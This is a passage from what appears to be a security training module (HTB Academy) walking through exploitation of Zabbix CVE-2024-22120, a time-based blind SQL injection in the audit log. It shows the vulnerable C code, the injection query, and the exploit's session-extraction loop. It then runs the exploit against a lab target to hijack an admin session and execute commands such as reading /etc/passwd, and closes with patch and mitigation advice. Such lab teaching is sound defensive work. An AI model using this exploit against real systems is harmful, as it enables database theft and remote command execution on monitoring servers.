0xffff96e5409a6500 watchdogd            88              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409a4bc0 kworker/1:1H         90              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403e1940 kswapd0              92              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403e4bc0 ecryptfs-kthrea      93              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403e0000 kthrotld             95              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403d1940 irq/24-pciehp        96              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409b9940 irq/25-pciehp        97              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409be500 irq/26-pciehp        98              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409bcbc0 irq/27-pciehp        99              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409bb280 irq/28-pciehp        100             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409b8000 irq/29-pciehp        101             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540a59940 irq/30-pciehp        102             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409b1940 irq/31-pciehp        103             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409b6500 irq/32-pciehp        104             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409b4bc0 irq/33-pciehp        105             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409b3280 irq/34-pciehp        106             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409b0000 irq/35-pciehp        107             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409ab280 irq/36-pciehp        108             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409a8000 irq/37-pciehp        109             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409a9940 irq/38-pciehp        110             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409ae500 irq/39-pciehp        111             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5409acbc0 irq/40-pciehp        112             2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e542060000 irq/41-pciehp        113             2               0
</code></pre>
<hr>
<h2 id="usage-example-zabbix-cve-2024-22120">Usage Example: Zabbix CVE-2024-22120</h2>
<h3 id="introduction">Introduction</h3>
<p>In today&#39;s rapidly evolving technological landscape, businesses increasingly rely on a growing number of systems to support their operations. As companies expand, their IT infrastructure becomes more complex, often spanning multiple platforms and environments. This exponential increase in systems makes it increasingly difficult to monitor effectively, leading to potential blind spots and inefficiencies. To address this, businesses strive to adopt automated and integrated IT monitoring systems like Zabbix, OpManager, Paessler PRTG, SolarWinds Server &amp; Application Monitor, and others that provide real-time visibility and insights, ensuring optimal performance, security, and scalability as they grow.</p>
<p><a href="https://www.zabbix.com/">Zabbix</a> is open-source software for system monitoring. It tracks the performance and availability of various IT components, from servers to applications and cloud services. Zabbix provides visualizations, real-time monitoring, and alerts, assisting administrators in ensuring system availability and reliability using agents.</p>
<p>The architecture of Zabbix consists of the following key components:</p>
<ul>
<li><code>Server</code>: The heart of the system monitoring and managing the communication from the agents.</li>
<li><code>Database storage</code>: Stores information gathered by agents and the configuration.</li>
<li><code>Web Interface</code>: A web-based graphical user interface for management, alerting, etc.</li>
<li><code>Proxy</code>: Can obtain data on behalf of a Zabbix server, acting as a load balancer.</li>
<li><code>Agent</code>: Software deployed on systems to actively monitor resources, applications, and execution of commands, sending data back to the Server.</li>
<li><code>Dashboards</code>: Personalized views of important data, including hosts, execution of predefined scripts, etc.</li>
</ul>
<p>As a leading player in the infrastructure monitoring sector, Zabbix represents a prime target for exploitation due to its extensive access to systems, often referred to as holding the &quot;keys to the kingdom.&quot; Zabbix offers various authentication methods, including HTTP, LDAP, SAML, and MFA. By default, Zabbix installs with a preset password (<code>zabbix</code>) for the Administrator role and has <code>guest</code> account access disabled, although this can be activated under certain conditions.</p>
<p>This section provides an analysis of <code>CVE-2024-22120</code>, a critical vulnerability in Zabbix, examining its underpinnings, exploitation methods, and mitigation strategies.</p>
<p>This section is divided into two parts:</p>
<ul>
<li><code>CVE-2024-22120 Analysis and Exploitation</code>: This part focuses on the technical details of the vulnerability, how it can be exploited, and strategies to both mitigate and detect it.</li>
<li><code>Post-Exploitation Forensic Analysis</code>: This part examines the forensic capabilities of Linux Purple Module targets by analyzing the system post-exploitation. It demonstrates how artifacts left by the attack can be identified and analyzed within a Linux Purple Module target to better understand the exploits impact and enhance our understanding of the attack from a defensive security perspective.</li>
</ul>
<h3 id="cve-2024-22120-analysis-and-exploitation">CVE-2024-22120 Analysis and Exploitation</h3>
<p>At the beginning of 2024, the security researcher Maxim Tyukov (<code>mf0cuz</code>) identified and reported a <a href="https://support.zabbix.com/browse/ZBX-24505">time-based blind SQL injection in Zabbix Server Audit Log</a> (<code>CVE-2024-22120</code>). The vulnerability allows a low-level user to dump the database via SQL injection, potentially leading to full control over the Zabbix server. The exploitation relies on the <code>Audit log</code> feature, which records user activities and changes within the system. When the server executes commands for configured scripts, the corresponding action(s) is logged in the audit log. Find out more about SQL injections in the following modules: <a href="https://academy.hackthebox.com/course/preview/sql-injection-fundamentals">SQL Injection Fundamentals</a>, <a href="https://academy.hackthebox.com/course/preview/sqlmap-essentials">SQLMap Essentials</a>, and <a href="https://academy.hackthebox.com/course/preview/advanced-sql-injections">Advanced SQL Injections</a>.</p>
<p><strong>Understanding the Vulnerability</strong></p>
<p>The code of the <a href="https://git.zabbix.com/projects/ZBX/repos/zabbix/browse/src/libs/zbxaudit/audit.c?until=9dcd92d79c4b57ad6ffe87ad296700447b02cc3a\&amp;untilPath=src%2Flibs%2Fzbxaudit%2Faudit.c">audit.c</a> file (<code>src/libs/zbxaudit/audit.c</code>) contained improper sanitization of the <code>clientip</code> field within the <code>zbx_auditlog_global_script</code> function. The <code>clientip</code> field can be manipulated in the request sent, enabling attackers to inject SQL queries and exploit time-based blind SQL injection.</p>
<p>The vulnerable portion of the code we can see below:</p>
<p>Code: c</p>
<pre><code class="lang-c">&lt;SNIP&gt;
    <span class="hljs-keyword">if</span> (ZBX_DB_OK &gt; zbx_db_execute(<span class="hljs-string">"insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,"</span>
            <span class="hljs-string">"resourcename,resourcetype,recordsetid,details) values ('%s',"</span> ZBX_FS_UI64 <span class="hljs-string">",'%s',%d,'%d','%s',"</span>
            ZBX_FS_UI64 <span class="hljs-string">",'%s',%d,'%s','%s')"</span>, auditid_cuid, userid, username, (<span class="hljs-keyword">int</span>)<span class="hljs-keyword">time</span>(NULL),
            ZBX_AUDIT_ACTION_EXECUTE, clientip, hostid, hostname, AUDIT_RESOURCE_SCRIPT, auditid_cuid,
            details_esc))
    {
        ret = FAIL;
    }
&lt;SNIP&gt;
</code></pre>
<p>The above code snippet shows that the <code>clientip</code> is being passed to the IP variable in the SQL statement.</p>
<p>Falling into the critical severity category with a CVSS base score of <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22120">9.1</a>, the following versions of Zabbix are susceptible to this exploit:</p>
<ul>
<li><code>6.0.0</code> - <code>6.0.27</code></li>
<li><code>6.4.0</code> - <code>6.4.12</code></li>
<li><code>7.0.0alpha1</code> - <code>7.0.0beta1</code></li>
</ul>
<hr>
<p><strong>Exploitation Process</strong></p>
<p>Let&#39;s navigate to the bottom of this section and click on &#39;<code>Click here to spawn the target system!</code>&#39;. Then, let&#39;s SSH into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.\</p>
<p>Before exploiting the vulnerability, let&#39;s take a moment to identify the <a href="https://github.com/W01fh4cker/CVE-2024-22120-RCE/blob/main/CVE-2024-22120-RCE.py">exploit</a>&#39;s requirements by leveraging the <code>-h</code> flag. Additionally, the <code>pwn</code> Python module should also be installed to ensure proper functionality of the exploit.</p>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ wget https://raw.githubusercontent.com/W01fh4cker/CVE-2024-22120-RCE/refs/heads/main/CVE-2024-22120-RCE.py
root@htb[/htb]$ pip3 <span class="hljs-keyword">install</span> pwn
root@htb[/htb]$ python3 CVE<span class="hljs-number">-2024</span><span class="hljs-number">-22120</span>-RCE.py -h
<span class="hljs-keyword">usage</span>: CVE<span class="hljs-number">-2024</span><span class="hljs-number">-22120</span>-RCE.py [-h] [<span class="hljs-comment">--false_time FALSE_TIME]</span>
                             [<span class="hljs-comment">--true_time TRUE_TIME] [--ip IP] [--port PORT]</span>
                             [<span class="hljs-comment">--sid SID] [--hostid HOSTID] [--prefix PREFIX]</span>

CVE<span class="hljs-number">-2024</span><span class="hljs-number">-22120</span>-RCE

options:
  -h, <span class="hljs-comment">--help            show this help message and exit</span>
  <span class="hljs-comment">--false_time FALSE_TIME</span>
                        <span class="hljs-keyword">Time</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">sleep</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">of</span> wrong guess(make it smaller
                        <span class="hljs-keyword">than</span> <span class="hljs-literal">true</span> <span class="hljs-keyword">time</span>, <span class="hljs-keyword">default</span>=<span class="hljs-number">1</span>)
  <span class="hljs-comment">--true_time TRUE_TIME</span>
                        <span class="hljs-keyword">Time</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">sleep</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">right</span> guess(make it bigger
                        <span class="hljs-keyword">than</span> <span class="hljs-literal">false</span> <span class="hljs-keyword">time</span>, <span class="hljs-keyword">default</span>=<span class="hljs-number">10</span>)
  <span class="hljs-comment">--ip IP               Zabbix server IP</span>
  <span class="hljs-comment">--port PORT           Zabbix server port(default=10051)</span>
  <span class="hljs-comment">--sid SID             Session ID of low privileged user</span>
  <span class="hljs-comment">--hostid HOSTID       hostid of any host accessible to user with defined sid</span>
  <span class="hljs-comment">--prefix PREFIX       Prefix for zabbix site. eg:</span>
                        https://ip/PREFIX/index.php
</code></pre>
<p>The exploit requires a couple of key elements for its execution as prerequisites for the <code>time-based SQL blind injection</code> vulnerability in the <code>auditd</code> log:</p>
<ul>
<li>The session ID (<code>sid</code>) of a low-privileged user with sufficient privileges to execute scripts on the Zabbix server.</li>
<li>The <code>hostid</code>.</li>
</ul>
<p><strong>Obtaining a Low-privileged User&#39;s Session ID</strong></p>
<p>The credentials below belong to a low-privileged user with sufficient privileges to execute scripts on the Zabbix server.</p>
<ul>
<li>URL: <code>http://&lt;Target_IP&gt;</code></li>
<li>Username: <code>htb-student</code></li>
<li>Password: <code>mysecurepassword</code></li>
</ul>
<p><i class="fa-arrow-circle-left">:arrow-circle-left:</i> <i class="fa-arrow-right">:arrow-right:</i> <i class="fa-redo">:redo:</i> <i class="fa-home">:home:</i><i class="fa-bars">:bars:</i><img src="https://academy.hackthebox.com/storage/modules/257/image2.png" alt="Zabbix dashboard showing host management with filters for name, host groups, IP, DNS, port, and severity. A dropdown menu under &#39;Zabbix server&#39; offers options like Dashboards, Problems, and Scripts including Ping and Traceroute."></p>
<p>The <code>sessionid</code> is stored in the <code>zbx_session</code> cookie, which is encoded in Base64 format.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/image3.png" alt="Browser storage panel showing cookies for http://10.129.231.23 with a session cookie named &#39;zbx\_session&#39; and its value."></p>
<p>The cookie can be decoded using the following method:</p>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">"eyJzZXNzaW9uaWQiOiIzNWFjYTZiOWVlMzk5NjRjYWE5NDNhMDhlYzdmZjkyOSIsInNlcnZlckNoZWNrUmVzdWx0Ijp0cnVlLCJzZXJ2ZXJDaGVja1RpbWUiOjE3MTczOTgwOTcsInNpZ24iOiI1YWZiMWMzYTUzNDZiYjY5ODIyMWEwMDg2MTY3ZmM2MGI1NTNmNzgyOTIyMDU0NGM2MWFmODA5NTdkZjZjZWUxIn0"</span> | base64 <span class="hljs-_">-d</span>

{<span class="hljs-string">"sessionid"</span>:<span class="hljs-string">"35aca6b9ee39964caa943a08ec7ff929"</span>,<span class="hljs-string">"serverCheckResult"</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">"serverCheckTime"</span>:1717398097,<span class="hljs-string">"sign"</span>:<span class="hljs-string">"5afb1c3a5346bb698221a0086167fc60b553f7829220544c61af80957df6cee1"</span>}
</code></pre>
<p><strong>Obtaining HostID</strong></p>
<p>The <code>hostid</code> can be retrieved by launching <code>Web Developer Tools</code> (Ctrl + Shift + I) in Firefox/Pwnbox and then searching for <code>hostids</code> in the page source as follows:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/hostids.png" alt="Zabbix dashboard displaying CPU utilization, system information, host availability, problems by severity, and a geomap. Inspector tool shows HTML code highlighting &#39;hostids&#39;."></p>
<p><strong>Understanding the Exploit Code</strong></p>
<p>Let&#39;s now take a moment to thoroughly analyze the exploit code.</p>
<p>The script automates the extraction of the admin <code>sessionid</code> from the database, retrieving it one character at a time using the following SQL query:</p>
<p>Code: sql</p>
<pre><code class="lang-sql">(<span class="hljs-keyword">select</span> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> sessionid <span class="hljs-keyword">from</span> sessions <span class="hljs-keyword">where</span> userid=<span class="hljs-number">1</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>),%d,<span class="hljs-number">1</span>)=\\<span class="hljs-string">"%c\\"</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-keyword">sleep</span>(%d) <span class="hljs-keyword">ELSE</span> <span class="hljs-keyword">sleep</span>(%d) <span class="hljs-keyword">END</span>)
</code></pre>
<p>The extraction occurs in the <code>ExtractAdminSessionId</code> function, which uses a <code>nested loop</code> structure. The outer loop iterates through each position of the target <code>sessionid</code> (from 1 to 32), while the inner loop tests potential characters (<code>0-9</code>, <code>a-f</code>) for that position. A time-based blind SQL injection is performed by sending a crafted query that uses <code>CASE</code> to induce a delay (<code>sleep(time_true)</code>) when the tested character is correct. The script calculates the time difference (<code>diff</code>) between sending the query and receiving the response. If <code>diff</code> matches the expected delay (<code>time_true</code>), the character is confirmed, appended to the <code>session_id</code>, and the loop proceeds to the next position. This process continues until all characters are extracted, returning the full admin <code>session_id</code>.</p>
<p>Code: python</p>
<pre><code class="lang-python">&lt;SNIP&gt;
def ExtractAdminSessionId(ip, port, sid, hostid, time_false, time_true):
    session_id = <span class="hljs-string">""</span>
    token_length = 32
    <span class="hljs-keyword">for</span> i in range(1, token_length+1):
        <span class="hljs-keyword">for</span> c in string.digits + <span class="hljs-string">"abcdef"</span>:
            before_query = datetime.now().timestamp()
            query = <span class="hljs-string">"(select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),%d,1)=\\"</span>%c\\<span class="hljs-string">") THEN sleep(%d) ELSE sleep(%d) END)"</span> % (i, c, time_true, time_false)
            SendMessage(ip, port, sid, hostid, query)
            after_query = datetime.now().timestamp()
            diff = after_query-before_query
            print(f<span class="hljs-string">"(+) Finding session_id\\t sessionid={GREEN}{session_id}{RED}{c}{NC}"</span>, end='\\r')
            <span class="hljs-keyword">if</span> time_true &gt; (after_query-before_query) &gt; time_false:
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">else</span>:
                session_id += c
                #print(<span class="hljs-string">"(+) session_id=%s"</span> % session_id, flush=True)
                <span class="hljs-keyword">break</span>
    print(f<span class="hljs-string">"(!) sessionid={session_id}"</span>)
    <span class="hljs-keyword">return</span> session_id
&lt;SNIP&gt;
</code></pre>
<p>Once the <code>sessionid</code> value is obtained, the script utilizes Zabbix&#39;s <a href="https://www.zabbix.com/documentation/current/en/manual/api">/api_jsonrpc.php</a> API endpoint to create a new script using the privileged session, enabling command execution on the Zabbix server. The exploit generates a script with an ambiguous name, which will be visible on the dashboard to privileged users.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/rpc.png" alt="Python script for CVE-2024-22120-RCE showing functions for creating, updating, and deleting scripts, with an RCE exploit function using JSON-RPC."></p>
<p><strong>Note</strong>: Please note that the exploit script uses the <a href="https://www.zabbix.com/documentation/current/en/manual/appendix/protocols/zabbix_sender">Zabbix sender protocol</a>, a Zabbix-specific JSON-based communication protocol, to send its malicious requests. This will prove handy later during the &quot;Post-Exploitation Forensic Analysis&quot; part in this section.</p>
<p><strong>Obtaining an Administrator&#39;s Session ID Through SQL Injection and Executing Commands</strong></p>
<p>With all requirements met and the exploit&#39;s code analyzed, we can now execute the <a href="https://github.com/W01fh4cker/CVE-2024-22120-RCE/blob/main/CVE-2024-22120-RCE.py">CVE-2024-22120-RCE.py</a> Python3 exploit code to perform the time-based blind SQL injection and retrieve an administrator&#39;s session ID as follows.</p>
<p><strong>Note</strong>: Due to the nature of the vulnerability, the script requires a few minutes to extract the admin <code>sessionid</code>, as it is an MD5 hash with a length of 32 characters. Once a valid session ID is retrieved, the script provides a prompt to execute commands on the Zabbix server.</p>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ python3 CVE<span class="hljs-number">-2024</span><span class="hljs-number">-22120</span>-RCE.py --ip &lt;Target_IP&gt; --sid <span class="hljs-number">35</span>aca6b9ee39964caa943a08ec7ff929 --hostid <span class="hljs-number">10084</span>

(!) sessionid=ac4edf78485a0236afdc77e8f4011e30

[zabbix_cmd]&gt;&gt;:  id
uid=<span class="hljs-number">114</span>(zabbix) gid=<span class="hljs-number">120</span>(zabbix) groups=<span class="hljs-number">120</span>(zabbix)

[zabbix_cmd]&gt;&gt;:  cat <span class="hljs-regexp">/etc/</span>passwd
<span class="hljs-string">root:</span><span class="hljs-string">x:</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-string">root:</span><span class="hljs-regexp">/root:/</span>bin/bash
<span class="hljs-string">daemon:</span><span class="hljs-string">x:</span><span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<span class="hljs-string">daemon:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">bin:</span><span class="hljs-string">x:</span><span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-string">bin:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sys:</span><span class="hljs-string">x:</span><span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-string">sys:</span><span class="hljs-regexp">/dev:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sync:</span><span class="hljs-string">x:</span><span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:<span class="hljs-string">sync:</span><span class="hljs-regexp">/bin:/</span>bin/sync
<span class="hljs-string">games:</span><span class="hljs-string">x:</span><span class="hljs-number">5</span>:<span class="hljs-number">60</span>:<span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">man:</span><span class="hljs-string">x:</span><span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-string">man:</span><span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/man:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">lp:</span><span class="hljs-string">x:</span><span class="hljs-number">7</span>:<span class="hljs-number">7</span>:<span class="hljs-string">lp:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/lpd:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">mail:</span><span class="hljs-string">x:</span><span class="hljs-number">8</span>:<span class="hljs-number">8</span>:<span class="hljs-string">mail:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">mail:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">news:</span><span class="hljs-string">x:</span><span class="hljs-number">9</span>:<span class="hljs-number">9</span>:<span class="hljs-string">news:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/news:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">uucp:</span><span class="hljs-string">x:</span><span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-string">uucp:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/uucp:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">proxy:</span><span class="hljs-string">x:</span><span class="hljs-number">13</span>:<span class="hljs-number">13</span>:<span class="hljs-string">proxy:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
www-<span class="hljs-string">data:</span><span class="hljs-string">x:</span><span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www-<span class="hljs-string">data:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">www:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">backup:</span><span class="hljs-string">x:</span><span class="hljs-number">34</span>:<span class="hljs-number">34</span>:<span class="hljs-string">backup:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">backups:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">list:</span><span class="hljs-string">x:</span><span class="hljs-number">38</span>:<span class="hljs-number">38</span>:Mailing List <span class="hljs-string">Manager:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">list:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">irc:</span><span class="hljs-string">x:</span><span class="hljs-number">39</span>:<span class="hljs-number">39</span>:<span class="hljs-string">ircd:</span><span class="hljs-regexp">/run/</span><span class="hljs-string">ircd:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">gnats:</span><span class="hljs-string">x:</span><span class="hljs-number">41</span>:<span class="hljs-number">41</span>:Gnats Bug-Reporting System (admin):<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gnats:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">nobody:</span><span class="hljs-string">x:</span><span class="hljs-number">65534</span>:<span class="hljs-number">65534</span>:<span class="hljs-string">nobody:</span><span class="hljs-regexp">/nonexistent:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">_apt:</span><span class="hljs-string">x:</span><span class="hljs-number">100</span>:<span class="hljs-number">65534</span>::<span class="hljs-regexp">/nonexistent:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
systemd-<span class="hljs-string">network:</span><span class="hljs-string">x:</span><span class="hljs-number">101</span>:<span class="hljs-number">102</span>:systemd Network Management,,,:<span class="hljs-regexp">/run/</span><span class="hljs-string">systemd:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
systemd-<span class="hljs-string">resolve:</span><span class="hljs-string">x:</span><span class="hljs-number">102</span>:<span class="hljs-number">103</span>:systemd Resolver,,,:<span class="hljs-regexp">/run/</span><span class="hljs-string">systemd:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">messagebus:</span><span class="hljs-string">x:</span><span class="hljs-number">103</span>:<span class="hljs-number">104</span>::<span class="hljs-regexp">/nonexistent:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
systemd-<span class="hljs-string">timesync:</span><span class="hljs-string">x:</span><span class="hljs-number">104</span>:<span class="hljs-number">105</span>:systemd Time Synchronization,,,:<span class="hljs-regexp">/run/</span><span class="hljs-string">systemd:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">pollinate:</span><span class="hljs-string">x:</span><span class="hljs-number">105</span>:<span class="hljs-number">1</span>::<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/pollinate:/</span>bin/<span class="hljs-literal">false</span>
<span class="hljs-string">sshd:</span><span class="hljs-string">x:</span><span class="hljs-number">106</span>:<span class="hljs-number">65534</span>::<span class="hljs-regexp">/run/</span><span class="hljs-string">sshd:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">syslog:</span><span class="hljs-string">x:</span><span class="hljs-number">107</span>:<span class="hljs-number">113</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">syslog:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">uuidd:</span><span class="hljs-string">x:</span><span class="hljs-number">108</span>:<span class="hljs-number">114</span>::<span class="hljs-regexp">/run/</span><span class="hljs-string">uuidd:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">tcpdump:</span><span class="hljs-string">x:</span><span class="hljs-number">109</span>:<span class="hljs-number">115</span>::<span class="hljs-regexp">/nonexistent:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">tss:</span><span class="hljs-string">x:</span><span class="hljs-number">110</span>:<span class="hljs-number">116</span>:TPM software stack,,,:<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/tpm:/</span>bin/<span class="hljs-literal">false</span>
<span class="hljs-string">landscape:</span><span class="hljs-string">x:</span><span class="hljs-number">111</span>:<span class="hljs-number">117</span>::<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/landscape:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
fwupd-<span class="hljs-string">refresh:</span><span class="hljs-string">x:</span><span class="hljs-number">112</span>:<span class="hljs-number">118</span>:fwupd-refresh user,,,:<span class="hljs-regexp">/run/</span><span class="hljs-string">systemd:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">usbmux:</span><span class="hljs-string">x:</span><span class="hljs-number">113</span>:<span class="hljs-number">46</span>:usbmux daemon,,,:<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/usbmux:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">lxd:</span><span class="hljs-string">x:</span><span class="hljs-number">999</span>:<span class="hljs-number">100</span>::<span class="hljs-regexp">/var/</span>snap<span class="hljs-regexp">/lxd/</span>common<span class="hljs-regexp">/lxd:/</span>bin/<span class="hljs-literal">false</span>
<span class="hljs-string">zabbix:</span><span class="hljs-string">x:</span><span class="hljs-number">114</span>:<span class="hljs-number">120</span>::<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/zabbix/</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin
Debian-<span class="hljs-string">snmp:</span><span class="hljs-string">x:</span><span class="hljs-number">115</span>:<span class="hljs-number">121</span>::<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/snmp:/</span>bin/<span class="hljs-literal">false</span>
<span class="hljs-string">mysql:</span><span class="hljs-string">x:</span><span class="hljs-number">116</span>:<span class="hljs-number">122</span>:MySQL Server,,,:<span class="hljs-regexp">/nonexistent:/</span>bin/<span class="hljs-literal">false</span>

[zabbix_cmd]&gt;&gt;:
</code></pre>
<p><strong>Mitigation</strong></p>
<p>To address the SQL injection vulnerability (<code>CVE-2024-22120</code>), the Zabbix team has released patches in versions <code>6.0.28rc1</code>, <code>6.4.13rc1</code>, and <code>7.0.0beta2</code>. Users are strongly encouraged to upgrade to these versions to mitigate the associated risks and maintain the security of their monitoring infrastructure. Regular updates are crucial for safeguarding against potential threats. Alternatively, if updating is not immediately feasible, the vulnerability can be mitigated by disabling the audit log functionality.</p>
<hr>
<h3 id="post-exploitation-forensic-analysis">Post-Exploitation Forensic Analysis</h3>
